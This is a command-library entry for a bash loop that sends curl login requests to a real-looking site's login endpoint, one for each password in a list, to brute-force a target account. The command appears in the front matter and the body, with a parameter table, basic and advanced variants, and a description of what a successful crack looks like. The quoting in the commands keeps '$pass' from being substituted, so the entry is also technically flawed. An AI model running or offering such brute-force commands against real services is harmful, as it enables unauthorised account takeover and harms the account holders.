---
id: cmd-uuid-7936-brute
data: >-
  for pass in $(cat passwords.txt); do curl -X POST
  https://www.secret.ly/_/login -H "Content-Type: application/json" -d
  '{"Login":"target@example.com","Password":"$pass"}'; done
tags:
  - brute-force
  - web
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:27:23.460Z'
verified: false
validated: true
submitted: true
---
# curl-brute-force

## Command

```bash
for pass in $(cat passwords.txt); do curl -X POST https://www.secret.ly/_/login -H "Content-Type: application/json" -d '{"Login":"target@example.com","Password":"$pass"}'; done
```

## Description

This bash loop command performs brute-force attacks by iterating over a password list and sending login requests to the target endpoint.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `for pass in $(cat passwords.txt)` | Loops over passwords from file | Yes |
| `-X POST` | HTTP method | Yes |
| `-H "Content-Type: application/json"` | JSON header | Yes |
| `-d '{...}'` | Payload with fixed login and variable password | Yes |

## Examples

### Basic Usage

```bash
for pass in password1 password2; do curl -X POST https://www.secret.ly/_/login -H "Content-Type: application/json" -d '{"Login":"target@example.com","Password":"$pass"}'; done
```

### Advanced Usage

```bash
while read pass; do curl -s -X POST https://www.secret.ly/_/login -H "Content-Type: application/json" -d '{"Login":"target@example.com","Password":"$pass"}' | grep success; done < passwords.txt
```

## Expected Output

Multiple responses; successful crack shows auth success, e.g., no error message in JSON.

## Related

- [[Related Procedure|procedures/Perform-Brute-Force-on-Login-Endpoint]]
